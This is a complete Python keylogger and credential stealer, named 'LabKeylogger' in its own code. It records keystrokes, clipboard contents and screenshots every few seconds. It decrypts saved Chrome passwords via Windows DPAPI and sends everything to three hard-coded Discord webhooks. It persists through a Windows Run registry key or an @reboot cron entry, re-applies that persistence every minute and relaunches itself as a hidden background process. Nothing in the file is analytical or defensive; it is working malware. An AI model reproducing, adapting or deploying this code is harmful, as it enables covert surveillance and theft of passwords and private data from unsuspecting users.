import sys
import subprocess
import threading
import requests
from pynput import keyboard
import time
import os
import platform
import pyperclip
import psutil
import signal
import sqlite3
import shutil
import ctypes
import ctypes.wintypes
from pathlib import Path
import mss
import mss.tools
import traceback

# ——— Auto-install Dependencies (per-user, no admin) —————————————————————
required = {
    "requests": "requests",
    "pynput": "pynput",
    "pyperclip": "pyperclip",
    "crontab": "python-crontab",
    "psutil": "psutil",
    "mss": "mss"
}

for module, pkg in required.items():
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg])

# ——— Configuration ——————————————————————————————————————————
KEY_WEBHOOK    = "https://discord.com/api/webhooks/1374531132959363072/G6SAyrzVq6Ns854CP2uyrTuQaWYbEItcNzDH3aZrfcpbxqo-Q8Fntyacc03yE7trnILj"
CLIP_WEBHOOK   = "https://discord.com/api/webhooks/1376396301398442076/oKIoUR0C86uhFFmqCoGzwIsbsTbYeNE_67CPaIH6guB2Gdk5LSEYkJL_2vT1bbmubJba"
SS_WEBHOOK     = "https://discord.com/api/webhooks/1374531136922845234/ATn7xY64ZMRrZWeXbdnkKOFJkEqxKVd7mPFH2KCdBCbTaEiFyd1XyWOoo7oAiJw73gan"
IDLE_DELAY     = 1.0
CLIP_DELAY     = 2.0
CHECK_CLIP     = 0.5
SCREENSHOT_INTERVAL = 3
PID_FILE       = os.path.expanduser("~/.lab_keylogger.pid")
LOG_FILE       = os.path.expanduser("~/.lab_keylogger.log")
PERSIST_CHECK_INTERVAL = 60  # seconds

# ——— Global State ——————————————————————————————————————————
keystrokes     = []
lock           = threading.Lock()
last_key_time  = 0.0
last_clip_time = 0.0
last_clip_val  = None
stop_evt       = threading.Event()
data_evt       = threading.Event()

def log_error(msg):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except:
        pass

# ——— Singleton / PID file ——————————————————————————————————————
def ensure_singleton():
    pid = None
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, "r") as f:
                pid = int(f.read().strip())
            if pid and psutil.pid_exists(pid):
                # Already running
                sys.exit()
        except Exception as e:
            log_error(f"error: {e}")
    try:
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))
    except Exception as e:
        log_error(f"error: {e}")

def cleanup_singleton():
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except Exception as e:
        log_error(f"error: {e}")

# ——— HTTP Post —————————————————————————————————————————————
def post(url, content):
    try:
        requests.post(url, json={"content": content}, timeout=10)
    except Exception as e:
        log_error(f"error: {e}")

def post_screenshot(webhook_url, image_bytes, filename="screenshot.png"):
    try:
        files = {
            "file": (filename, image_bytes, "image/png")
        }
        requests.post(webhook_url, files=files, timeout=15)
    except Exception as e:
        log_error(f"error: {e}")

# ——— Flush Keystrokes ————————————————————————————————————————
def flush_keys():
    global keystrokes
    with lock:
        if not keystrokes:
            return
        payload = "".join(keystrokes)
        keystrokes = []
    post(KEY_WEBHOOK, payload)

# ——— Keystroke Sender Thread ————————————————————————————————————
def key_sender():
    global last_key_time
    while not stop_evt.is_set():
        data_evt.wait(timeout=IDLE_DELAY)
        now = time.time()
        with lock:
            idle = now - last_key_time if last_key_time else None
            has_data = bool(keystrokes)
        if has_data and idle is not None and idle >= IDLE_DELAY:
            flush_keys()
            data_evt.clear()
    flush_keys()

# ——— Clipboard Watcher Thread ————————————————————————————————————
def clip_watcher():
    global last_clip_val, last_clip_time
    while not stop_evt.is_set():
        try:
            clip = pyperclip.paste()
        except Exception:
            clip = None
        now = time.time()
        if clip and clip != last_clip_val and (now - last_clip_time) >= CLIP_DELAY:
            last_clip_val  = clip
            last_clip_time = now
            post(CLIP_WEBHOOK, "[CLIPBOARD]\n" + clip)
        time.sleep(CHECK_CLIP)

# ——— Screenshot Thread ————————————————————————————————————————
def screenshot_worker():
    with mss.mss() as sct:
        monitor = sct.monitors[0]
        while not stop_evt.is_set():
            try:
                raw_img = sct.grab(monitor)
                img_bytes = mss.tools.to_png(raw_img.rgb, raw_img.size)
                post_screenshot(SS_WEBHOOK, img_bytes)
            except Exception as e:
                log_error(f"Screenshot error: {e}")
            for _ in range(SCREENSHOT_INTERVAL * 10):
                if stop_evt.is_set():
                    break
                time.sleep(0.1)

# ——— Keystroke Listener Callback —————————————————————————————
def on_press(key):
    global last_key_time
    try:
        char = key.char
    except AttributeError:
        key_map = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '[ENTER]',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACK]',
        }
        name = getattr(key, "name", str(key)).upper()
        char = key_map.get(key, f'[{name}]')
    with lock:
        keystrokes.append(char)
        last_key_time = time.time()
    data_evt.set()

# ——— Persistence Setup ————————————————————————————————————————
def setup_persistence():
    system = platform.system()
    script = os.path.abspath(__file__)
    if system == "Windows":
        try:
            import winreg
            pythonw = sys.executable
            if pythonw.lower().endswith("python.exe"):
                pythonw = pythonw[:-10] + "pythonw.exe"
            # fallback if pythonw.exe not found:
            if not os.path.exists(pythonw):
                pythonw = sys.executable  # fallback to python.exe

            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "LabKeylogger", 0, winreg.REG_SZ,
                                  f'"{pythonw}" "{script}"')
        except Exception as e:
            log_error(f"Persistence Windows registry error: {traceback.format_exc()}")
    else:
        try:
            from crontab import CronTab
            user_cron = CronTab(user=True)
            # Remove old jobs with this script
            for job in user_cron.find_command(script):
                user_cron.remove(job)
            job = user_cron.new(command=f"{sys.executable} {script} run", comment="LabKeylogger")
            job.every_reboot()
            user_cron.write()
        except Exception:
            # fallback to direct crontab edit
            try:
                cron_line = f"@reboot {sys.executable} {script} run"
                existing = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode()
                lines = [l for l in existing.splitlines() if script not in l]
                lines.append(cron_line)
                p = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
                p.communicate(input="\n".join(lines).encode())
            except Exception as e:
                log_error(f"cron error: {traceback.format_exc()}")

# ——— Persistence Watchdog Thread ———————————————————————————————
def persistence_watchdog():
    while not stop_evt.is_set():
        try:
            setup_persistence()
        except Exception as e:
            log_error(f"watchdog error: {traceback.format_exc()}")
        for _ in range(PERSIST_CHECK_INTERVAL * 10):
            if stop_evt.is_set():
                break
            time.sleep(0.1)

# ——— Chrome Password Grabber ————————————————————————————————————
def dpapi_decrypt(encrypted_bytes):
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]

    CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
    CryptUnprotectData.argtypes = [ctypes.POINTER(DATA_BLOB), ctypes.POINTER(ctypes.c_wchar_p),
                                   ctypes.POINTER(DATA_BLOB), ctypes.c_void_p,
                                   ctypes.c_void_p, ctypes.wintypes.DWORD, ctypes.POINTER(DATA_BLOB)]
    CryptUnprotectData.restype = ctypes.wintypes.BOOL

    in_blob = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
    out_blob = DATA_BLOB()
    if CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
        pointer = out_blob.pbData
        size = out_blob.cbData
        decrypted = ctypes.string_at(pointer, size)
        ctypes.windll.kernel32.LocalFree(pointer)
        return decrypted
    else:
        return None

def read_chrome_passwords():
    user_profile = os.environ.get("USERPROFILE")
    login_data_path = Path(user_profile) / r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
    temp_copy = Path("./LoginData_copy.db")

    if not login_data_path.exists():
        return None

    try:
        shutil.copy2(login_data_path, temp_copy)
        conn = sqlite3.connect(str(temp_copy))
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        creds = []
        for origin_url, username, encrypted_password in cursor.fetchall():
            if not username:
                continue
            decrypted_password = dpapi_decrypt(encrypted_password)
            if decrypted_password is None:
                decrypted_password = b"[Decryption failed]"
            else:
                decrypted_password = decrypted_password.decode(errors="replace")
            creds.append({
                "url": origin_url,
                "username": username,
                "password": decrypted_password
            })
        cursor.close()
        conn.close()
        temp_copy.unlink()
        return creds
    except Exception as e:
        log_error(f"word read error: {traceback.format_exc()}")
        try:
            temp_copy.unlink()
        except:
            pass
        return None

def send_passwords_to_webhook(creds):
    if not creds:
        return
    content_lines = []
    for c in creds:
        content_lines.append(f"URL: {c['url']}\nUser: {c['username']}\nPass: {c['password']}\n---")
    content = "\n".join(content_lines)
    post(CLIP_WEBHOOK, "[CHROME PASSWORDS]\n" + content)

# ——— Run Keylogger ————————————————————————————————————————————
def run():
    ensure_singleton()
    setup_persistence()

    # Start persistence watchdog to ensure persistence remains
    t_persist = threading.Thread(target=persistence_watchdog, daemon=True)
    t_persist.start()

    creds = read_chrome_passwords()
    if creds:
        send_passwords_to_webhook(creds)

    signal.signal(signal.SIGTERM, lambda s, f: stop_evt.set())
    signal.signal(signal.SIGINT,  lambda s, f: stop_evt.set())

    t_keys = threading.Thread(target=key_sender, daemon=True)
    t_clip = threading.Thread(target=clip_watcher, daemon=True)
    t_ss   = threading.Thread(target=screenshot_worker, daemon=True)
    t_keys.start()
    t_clip.start()
    t_ss.start()

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()

    stop_evt.wait()

    listener.stop()
    data_evt.set()
    t_keys.join()
    t_clip.join()
    t_ss.join()

    cleanup_singleton()

# ——— Launcher (Hidden Subprocess) —————————————————————————————
def launcher():
    system = platform.system()
    script = os.path.abspath(__file__)
    if system == "Windows":
        pythonw = sys.executable
        if pythonw.lower().endswith("python.exe"):
            pythonw = pythonw[:-10] + "pythonw.exe"
        if not os.path.exists(pythonw):
            pythonw = sys.executable  # fallback

        flags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
        subprocess.Popen([pythonw, script, "run"], creationflags=flags, close_fds=True)
    else:
        subprocess.Popen([sys.executable, script, "run"],
                         preexec_fn=os.setpgrp, close_fds=True)

# ——— Entry Point ————————————————————————————————————————————
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        run()
    else:
        launcher()
